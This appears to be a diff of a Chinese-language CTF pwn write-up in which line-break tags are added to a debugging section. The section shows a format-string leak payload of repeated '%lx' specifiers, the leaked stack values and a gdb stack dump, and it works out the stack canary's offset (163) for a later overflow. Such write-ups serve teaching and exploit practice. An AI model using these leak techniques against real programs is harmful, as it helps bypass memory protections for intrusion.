@@ -62,24 +62,25 @@ unsigned __int64 sub_91C()
 
 ---
 调试：
-输入
-2AAAAAAAA,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx
-输出
-AAAAAAAA,7fffffffb1d0,7ffff7dd3780,7ffff7b042c0,7ffff7fda700,c,32007ffff7fdb000,1,4141414141414141,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c
-查看栈中的内容：
---More--(150/200)
-1200| 0x7fffffffdd10 --> 0x19 
-1208| 0x7fffffffdd18 --> 0x7ffff7dd2620 --> 0xfbad2887 
-1216| 0x7fffffffdd20 --> 0x555555554b44 ("<insert something clever>")
-1224| 0x7fffffffdd28 --> 0x7ffff7a7c7fa (<_IO_puts+362>:	cmp    eax,0xffffffff)
-1232| 0x7fffffffdd30 --> 0x0 
-1240| 0x7fffffffdd38 --> 0x7fffffffdd50 --> 0x7fffffffdd70 --> 0x555555554ac0 (push   r15)
-1248| 0x7fffffffdd40 --> 0x5555555547e0 (xor    ebp,ebp)
-1256| 0x7fffffffdd48 --> 0xc8d1cdd933276500 
-1264| 0x7fffffffdd50 --> 0x7fffffffdd70 --> 0x555555554ac0 (push   r15)
-1272| 0x7fffffffdd58 --> 0x555555554aac (mov    eax,0x0)
-1280| 0x7fffffffdd60 --> 0x7fffffffde58 --> 0x7fffffffe20a ("/home/hdd/oj/pwni/pwnio")
-1288| 0x7fffffffdd68 --> 0x100000000
+输入</br>
+2AAAAAAAA,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx</br>
+输出</br>
+AAAAAAAA,7fffffffb1d0,7ffff7dd3780,7ffff7b042c0,7ffff7fda700,c,32007ffff7fdb000,1,4141414141414141,786c252c786c252c,786c252c78</br>6c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c,786c252c786c252c</br>
+查看栈中的内容：</br>
+--More--(150/200)</br>
+1200| 0x7fffffffdd10 --> 0x19 </br>
+1208| 0x7fffffffdd18 --> 0x7ffff7dd2620 --> 0xfbad2887 </br>
+1216| 0x7fffffffdd20 --> 0x555555554b44 ("<insert something clever>") </br>
+1224| 0x7fffffffdd28 --> 0x7ffff7a7c7fa (<_IO_puts+362>:	cmp    eax,0xffffffff) </br>
+1232| 0x7fffffffdd30 --> 0x0 </br>
+1240| 0x7fffffffdd38 --> 0x7fffffffdd50 --> 0x7fffffffdd70 --> 0x555555554ac0 (push   r15)</br>
+1248| 0x7fffffffdd40 --> 0x5555555547e0 (xor    ebp,ebp)</br>
+1256| 0x7fffffffdd48 --> 0xc8d1cdd933276500 </br>
+1264| 0x7fffffffdd50 --> 0x7fffffffdd70 --> 0x555555554ac0 (push   r15)</br>
+1272| 0x7fffffffdd58 --> 0x555555554aac (mov    eax,0x0)</br>
+1280| 0x7fffffffdd60 --> 0x7fffffffde58 --> 0x7fffffffe20a ("/home/hdd/oj/pwni/pwnio")</br>
+1288| 0x7fffffffdd68 --> 0x100000000</br>
+
 可以看到在158处就是canary的位置。但是相对于格式化字符串的参数，他在163的位置，因为AAAAAAAA是在栈中第八个显示的，显示在第三的位置，相差5，所以canary的位置=158+5=163.
 
 
